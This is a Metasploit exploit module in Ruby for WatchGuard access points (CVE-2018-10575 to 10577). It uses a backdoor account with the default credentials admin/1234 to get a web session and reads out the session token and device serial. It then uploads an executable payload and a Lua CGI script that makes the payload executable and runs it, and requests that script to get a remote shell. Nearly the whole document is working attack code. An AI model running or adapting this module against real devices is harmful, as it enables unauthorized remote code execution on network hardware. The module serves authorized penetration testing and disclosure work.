# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
   
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;        => &#039;Watchguard AP Backdoor Shell&#039;,
      &#039;Description&#039; => &#039;Watchguard AP\&#039;s have a backdoor account with known credentials. This can be used to
                        gain a valid web session on the HTTP administration interface. The administrator
                        can then upload a shell directly to the web root to execute it.
                        This module can also be used if you have legitimate access credentials to the device.&#039;,
      &#039;References&#039;  =>
        [
            [&#039;CVE&#039;, &#039;CVE-2018-10575&#039;],
        [&#039;CVE&#039;, &#039;CVE-2018-10576&#039;],
        [&#039;CVE&#039;, &#039;CVE-2018-10577&#039;],
            [&#039;URL&#039;, &#039;http://seclists.org/fulldisclosure/2018/May/12&#039;],
        [&#039;URL&#039;, &#039;https://watchguardsupport.secure.force.com/publicKB?type=KBSecurityIssues&SFDCID=kA62A0000000LIy&#039;],
        ],
      &#039;Author&#039;      => &#039;Stephen Shkardoon &#039;, # ss23 / @ss2342
      &#039;License&#039;     => MSF_LICENSE,
      &#039;Platform&#039;    => &#039;linux&#039;,
      &#039;Targets&#039;        => [ [ &#039;Automatic&#039;, { } ] ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;Arch&#039;           => ARCH_MIPSBE,
    ))
 
    register_options(
      [
        Opt::RPORT(443),
        #Opt::SSL(true),
        OptString.new(&#039;WG_USER&#039;, [ true, &#039;The username to authenticate as&#039;, &#039;admin&#039;]),
        OptString.new(&#039;WG_PASS&#039;, [ true, &#039;The password for the specified username&#039;, &#039;1234&#039;]),
      ])
  end
 
  def exploit
  begin
    res = send_request_cgi({
        &#039;method&#039;  => &#039;GET&#039;,
        &#039;uri&#039;     => &#039;/cgi-bin/luci/&#039;,
        &#039;headers&#039; => {
          &#039;AUTH_USER&#039; => datastore[&#039;WG_USER&#039;],
          &#039;AUTH_PASS&#039; => datastore[&#039;WG_PASS&#039;],
        },
      })
 
    if res.nil? || res.get_cookies.empty?
        fail_with(Failure::NotFound, &#039;Unable to obtain a valid session with provided credentials&#039;)
      end
       
      # We have a valid session, so we should pull out the access credentials and find the serial number
      sysauth = res.get_cookies.scan(/(sysauth=\w+);*/).flatten[0]
    stok = res.redirection.to_s.scan(/;(stok=\w+)/).flatten[0]
     
      vprint_status("Got sysauth #{sysauth}")
    vprint_status("Got stok #{stok}")
     
    res = send_request_cgi({
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;uri&#039;       => "/cgi-bin/luci/;#{stok}/html/Status",
        &#039;headers&#039; => {
          &#039;AUTH_USER&#039; => datastore[&#039;WG_USER&#039;],
          &#039;AUTH_PASS&#039; => datastore[&#039;WG_PASS&#039;],
        },
        &#039;cookie&#039;    => sysauth,
      })
     
    if res.nil? || res.code != 200
      fail_with(Failure::NotFound, &#039;Unable to request serial&#039;)
      end
     
    # Pull out the serial and store it for later
    # var   device_serial = "20AP0XXXXXXXX";
    if res.body.match(/device_serial = "(\w+)";/)
      serial = $1
    else
      fail_with(Failure::NotFound, &#039;Unable to find serial in response&#039;)
    end
     
    vprint_status("Got serial #{serial}")
 
    # Finally, upload our payloads
    res = send_request_cgi({
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => "/cgi-bin/luci/;#{stok}/wgupload",
        &#039;headers&#039; => {
          &#039;AUTH_USER&#039; => datastore[&#039;WG_USER&#039;],
          &#039;AUTH_PASS&#039; => datastore[&#039;WG_PASS&#039;],
        },
        &#039;cookie&#039;    => "#{sysauth}; serial=#{serial}; filename=/tmp/payload; md5sum=fail",
        &#039;data&#039;      => payload.encoded_exe,
      })
 
    if res.nil? || res.code != 205
      fail_with(Failure::NotFound, "Could not upload file 1: #{res.body}")
    end
   
    # Upload the lua script that executes our payload
    res = send_request_cgi({
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;uri&#039;       => "/cgi-bin/luci/;#{stok}/wgupload",
        &#039;headers&#039; => {
          &#039;AUTH_USER&#039; => datastore[&#039;WG_USER&#039;],
          &#039;AUTH_PASS&#039; => datastore[&#039;WG_PASS&#039;],
        },
        &#039;cookie&#039;    => "#{sysauth}; serial=#{serial}; filename=/www/cgi-bin/payload.luci; md5sum=fail",
        &#039;data&#039;     => "#!/usr/bin/lua
os.execute(&#039;/bin/chmod +x /tmp/payload&#039;);       
os.execute(&#039;/tmp/payload&#039;);"
      })
     
    if res.nil? || res.code != 205
      fail_with(Failure::NotFound, "Could not upload file 1: #{res.body}")
    end
     
    # Remove the trigger script once we&#039;ve got a shell
    register_file_for_cleanup("/www/cgi-bin/payload.luci")
     
    vprint_status("Uploaded lua script")
     
    # Trigger our payload
    res = send_request_cgi({
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;uri&#039;       => "/cgi-bin/payload.luci",
      })
       
    vprint_status("Requested lua payload")
     
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      vprint_error("Failed to connect to the web server")
      return nil
    end
  end
end

